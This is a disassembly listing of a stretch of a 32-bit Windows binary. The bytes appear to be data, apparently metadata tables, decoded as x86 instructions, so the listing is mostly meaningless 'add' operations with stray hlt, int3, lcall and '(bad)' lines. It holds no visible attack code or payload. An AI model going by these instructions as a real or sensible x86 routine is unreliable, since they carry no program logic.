  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 db 14 72    	add    %dl,0x7214db08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 76 03 0a    	add    %dl,0xa037600(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 c1 09 84    	add    %dl,-0x7bf63f00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 6a 24 89    	add    %dl,-0x76db9600(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 1a 1c 0a    	add    %dl,0xa1c1a00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 90 1b 94 00 10    	add    %dl,0x1000941b(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 3d 02 58 00 11    	add    %bh,0x11005802
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 94 24 9a    	add    %dl,-0x65db6c00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 f0 18 9a    	add    %dl,-0x65e71000(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 19 1e 0a    	add    %dl,0xa1e1918(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 8c 02 0a 00 14 00 	add    %cl,0x14000a(%edx,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	13 1e                	adc    (%esi),%ebx
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 7d 04 0a    	add    %dl,0xa047d00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 9a 23 1d    	add    %dl,0x1d239a00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 92 08 1d    	add    %dl,0x1d089200(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 db 23 1d    	add    %dl,0x1d23db00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 79 05             	add    %bh,0x5(%ecx)
  40641a:	1d 00 14 00 20       	sbb    $0x20001400,%eax
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 f2                	add    %dh,%dl
  406427:	06                   	push   %es
  406428:	1d 00 14 00 78       	sbb    $0x78001400,%eax
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 13 1e 0e    	add    %al,0xe1e1318(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ba 13 c3 00 14    	add    %bh,0x1400c313(%edx)
  406447:	00 f0                	add    %dh,%al
  406449:	36 00 00             	add    %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 64 09 c7          	add    %ah,-0x39(%ecx,%ecx,1)
  406453:	00 14 00             	add    %dl,(%eax,%eax,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 e5                	add    %ah,%ch
  40645f:	02 53 00             	add    0x0(%ebx),%dl
  406462:	15 00 7b 21 00       	adc    $0x217b00,%eax
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 22 1b 1d    	add    %dl,0x1d1b2200(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 32 05 0a    	add    %dl,0xa053200(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 45 08 c3    	add    %dl,-0x3cf7bb00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 5a 0b d5    	add    %dl,-0x2af4a600(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 7f 02 0a    	add    %dl,0xa027f00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 c9 06 c3    	add    %dl,-0x3cf93700(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 0d 05 1d    	add    %dl,0x1d050d00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 37 15 0a    	add    %dl,0xa153700(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 f3    	add    %al,-0xcdf6a00(%eax)
  4064dd:	16                   	push   %ss
  4064de:	e0 00                	loopne 0x4064e0
  4064e0:	16                   	push   %ss
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 a6    	add    %al,-0x59df6a00(%eax)
  4064eb:	09 e4                	or     %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 de    	add    %al,-0x21df6a00(%eax)
  4064f9:	20 ec                	and    %ch,%ah
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 87    	add    %al,-0x78df6a00(%eax)
  406507:	13 f1                	adc    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 1a    	add    %al,0x1a209600(%eax)
  406515:	06                   	push   %es
  406516:	f8                   	clc
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 5e 03             	and    %bl,0x3(%esi)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 2e 08 1c    	add    %dl,0x1c082e00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 e0 08 0a    	add    %dl,0xa08e000(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 27                	add    %ah,(%edi)
  40654d:	26 0a 00             	or     %es:(%eax),%al
  406550:	22 00                	and    (%eax),%al
  406552:	f4                   	hlt
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 41 03 23    	add    %dl,0x23034100(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 48 07             	add    %cl,0x7(%eax)
  40656a:	2a 01                	sub    (%ecx),%al
  40656c:	24 00                	and    $0x0,%al
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 ff 01 84    	add    %dl,-0x7bfe0100(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 a2 0b 1d    	add    %dl,0x1d0ba200(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 19 1e 0a    	add    %dl,0xa1e1918(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 f2 02 9a    	add    %dl,-0x65fd0e00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 15 24 38 01 27    	add    %dl,0x27013824
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 fe 05 0a    	add    %dl,0xa05fe00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 29 1c 3e    	add    %dl,0x3e1c2900(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 19                	sbb    %bl,(%ecx)
  4065d9:	1e                   	push   %ds
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	13 1e                	adc    (%esi),%ebx
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	ec                   	in     (%dx),%al
  4065f5:	23 70 01             	and    0x1(%eax),%esi
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	ff 04 75 01 2b 00 6e 	incl   0x6e002b01(,%esi,2)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 4d 05 70    	add    %al,0x70054d00(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 fc 14 75    	add    %al,0x7514fc00(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 20 0a 7c 01    	addl   $0x17c0a20,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 19 1e 0a    	add    %dl,0xa1e1918(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 d7                	add    %dl,%bh
  406649:	06                   	push   %es
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 c7                	add    %al,%bh
  406657:	20 84 01 31 00 9f 22 	and    %al,0x229f0031(%ecx,%eax,1)
  40665e:	00 00                	add    %al,(%eax)
  406660:	00 00                	add    %al,(%eax)
  406662:	96                   	xchg   %eax,%esi
  406663:	00 09                	add    %cl,(%ecx)
  406665:	23 2a                	and    (%edx),%ebp
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 6c 1a 93          	add    %ch,-0x6d(%edx,%ebx,1)
  406675:	01 33                	add    %esi,(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 d0 0a 93    	add    %dl,-0x6cf53000(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 36                	add    %dh,(%esi)
  40668f:	09 93 01 35 00 10    	or     %edx,0x10003501(%ebx)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 2d 25 84 01 36    	add    %ch,0x36018425
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 87 24 99    	add    %dl,-0x66db7900(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 c1 15 9f    	add    %dl,-0x60ea3f00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 e3 06 a5    	add    %dl,-0x5af91d00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 a4 00 ab    	add    %dl,-0x54ff5c00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	13 1e                	adc    (%esi),%ebx
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 19 1e 0a    	add    %dl,0xa1e1918(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 13 1e b1    	add    %al,-0x4ee1ece8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 5b 22             	or     %ebx,0x22(%ebx)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 32                	add    %esi,(%edx)
  40671b:	23 bf 01 3c 00 63    	and    0x63003c01(%edi),%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 82 21 0e 00 3c    	add    %eax,0x3c000e21(%edx)
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 13 1e cb    	add    %al,-0x34e1ece8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 fe 18 d7    	add    %al,-0x28e70200(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 5d 1a dc    	add    %al,-0x23e5a300(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 63 02 e2    	add    %al,-0x1dfd9d00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 05 25 e8    	add    %al,-0x17dafb00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 5b 18 ee    	add    %al,-0x11e7a4f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	7f 15                	jg     0x4067a1
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 fc 00 6b 01    	addl   $0x16b00fc,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 14 16 0e 00    	addl   $0xe1614,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 b8 08 d7 01    	addl   $0x1d708b8,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 93 0a 0a 02    	addl   $0x20a0a93,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	83 08 dc             	orl    $0xffffffdc,(%eax)
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 27 21 d7    	add    %al,-0x28ded900(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 4e 03 d7    	add    %al,-0x28fcb200(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 91 10 d7    	add    %al,-0x28ef6f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 c2 05 0f 02    	addl   $0x20f05c2,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 8a 15 0f 02    	addl   $0x20f158a,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	9a 09 15 02 47 00 5f 	lcall  $0x5f00,$0x47021509
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 9b 17 1a    	add    %al,0x1a179b00(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 89 1a 1f    	add    %al,0x1f1a8900(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40684f:	23 23                	and    (%ebx),%esp
  406851:	02 49 00             	add    0x0(%ecx),%cl
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 bb 03 27    	add    %al,0x2703bb00(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	0b 02                	or     (%edx),%eax
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	a2 0a 31 02 4a       	mov    %al,0x4a02310a
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 15 08 36    	add    %al,0x36081500(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 74 0a 3c          	add    %dh,0x3c(%edx,%ecx,1)
  406897:	02 4c 00 6c          	add    0x6c(%eax,%eax,1),%cl
  40689b:	4b                   	dec    %ebx
  40689c:	00 00                	add    %al,(%eax)
  40689e:	00 00                	add    %al,(%eax)
  4068a0:	86 00                	xchg   %al,(%eax)
  4068a2:	98                   	cwtl
  4068a3:	15 42 02 4e 00       	adc    $0x4e0242,%eax
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 ce 09 42    	add    %al,0x4209ce00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	a3 25 dc 01 50       	mov    %eax,0x5001dc25
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 cf 05 0e    	add    %al,0xe05cf00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 9d 03 6b    	add    %al,0x6b039d00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 7d 0d 47    	add    %al,0x470d7d00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 b3 0a 4b    	add    %al,0x4b0ab300(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	5d                   	pop    %ebp
  406905:	16                   	push   %ss
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	15 0a 55 02 54       	adc    $0x5402550a,%eax
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	20 0b                	and    %cl,(%ebx)
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	f7 07 6b 01 56 00    	testl  $0x56016b,(%edi)
  406934:	48                   	dec    %eax
  406935:	4d                   	dec    %ebp
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	22 25 0f 02 57 00    	and    0x57020f,%ah
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	e1 00                	loope  0x40694c
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	4b                   	dec    %ebx
  406959:	02 0f                	add    (%edi),%cl
  40695b:	02 58 00             	add    0x0(%eax),%bl
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	8d 14 47             	lea    (%edi,%eax,2),%edx
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	9a 14 6b 01 59 00 45 	lcall  $0x4500,$0x59016b14
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	19 1d 23 02 5a 00    	sbb    %ebx,0x5a0223
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	27                   	daa
  406991:	1d 15 02 5a 00       	sbb    $0x5a0215,%eax
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	0f 21 27             	mov    %db4,%edi
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	1b 21                	sbb    (%ecx),%esp
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
